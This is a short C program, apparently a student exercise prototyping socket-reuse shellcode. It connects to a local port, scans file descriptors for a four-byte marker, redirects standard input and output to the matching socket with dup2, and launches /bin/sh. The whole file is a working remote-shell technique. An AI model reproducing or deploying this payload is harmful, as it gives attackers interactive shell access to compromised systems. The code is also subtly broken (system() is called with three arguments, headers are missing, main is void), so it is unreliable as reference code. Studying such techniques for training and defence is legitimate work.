#include <sys/socket.h>
#include <netinet/ip.h>

void main(int argc, char *argv[])
{
    unsigned short int fd = 2560;
    char buffer[2560] = {0};

    // START block of code of code taken from assignment n.2

    int client_socket_fd;
    char *empty[] = { 0 };
    struct sockaddr_in client_address;

    client_socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    client_address.sin_family = AF_INET;
    inet_aton("127.0.0.1", &client_address.sin_addr);
    client_address.sin_port = htons(4444);
    connect(client_socket_fd, (struct sockaddr *)&client_address, sizeof(client_address));

    // END block of code of code taken from assignment n.2

    printf("[+] Trying to find the correct file descriptor\n");
    while (1)
    {
        recv(fd, &buffer, 2560, MSG_DONTWAIT);
        if (buffer[0] == 102 && buffer[1] == 106 && buffer[2] == 72 && buffer[3] == 104)
        {
            printf("[+] Correct file descriptor: %d\n", fd);
            break;
        } else
        {
            fd++;
        }
    }

    printf("[+] Redirecting error, output, and input\n");
    for (int i = 2; i >= 0; i--)
    {
        dup2(fd, i);
    }

    printf("[+] Here's your shell:\n");
    system("/bin//sh", "/bin//sh\n", 0);
}
